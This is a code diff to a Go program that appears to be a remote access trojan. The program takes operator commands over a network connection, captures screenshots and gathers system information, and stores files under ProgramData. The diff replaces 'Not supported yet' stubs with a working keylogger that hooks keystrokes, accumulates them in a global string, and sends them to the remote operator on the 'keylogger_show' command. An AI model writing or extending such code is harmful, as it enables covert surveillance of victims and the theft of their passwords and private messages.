@@ -10,7 +10,8 @@ import (
 	"os"
 	"os/exec"
 	"strconv"
-
+	"fmt"
+	hook "github.com/robotn/gohook"
 	screenshot "github.com/kbinani/screenshot"
 	goInfo "github.com/matishsiao/goInfo"
 )
@@ -21,6 +22,10 @@ const (
 	FOLDER_PATH        = "\\ProgramData"
 	FOLDER_EXT         = "\\NameFolderExtesion"
 	newLine     string = "\n"
+)
+
+var(
+	Logs string = ""
 )
 
 func main() {
@@ -65,11 +70,12 @@ func Connect() {
 			RemoveNewLineCharFromConnection(conn)
 
 		case "keylogger_start":
-			SendMessage(conn, " [i] Not supported yet!")
+			go Keylogger() // Run a go routine for Keylogger function
+			SendMessage(conn, " [i] Keylogger Listening!")
 			RemoveNewLineCharFromConnection(conn)
 
 		case "keylogger_show":
-			SendMessage(conn, " [i] Not supported yet!")
+			SendMessage(conn, Logs)
 			RemoveNewLineCharFromConnection(conn)
 
 		case "download":
@@ -223,4 +229,17 @@ func GetOSInformation() string {
 	osInformation += "\n" + " Hostname: " + gi.Hostname
 	osInformation += "\n" + " CPUs: " + strconv.Itoa(gi.CPUs)
 	return osInformation
+}
+
+func Keylogger(){
+	EvChan := hook.Start()
+	defer hook.End()
+	
+	for ev := range EvChan {
+		// fmt.Println(ev)
+		switch ev.Kind{
+		case hook.KeyDown:
+			Logs = fmt.Sprintf("%s%c",Logs,ev.Keychar)
+		}
+	}
 }
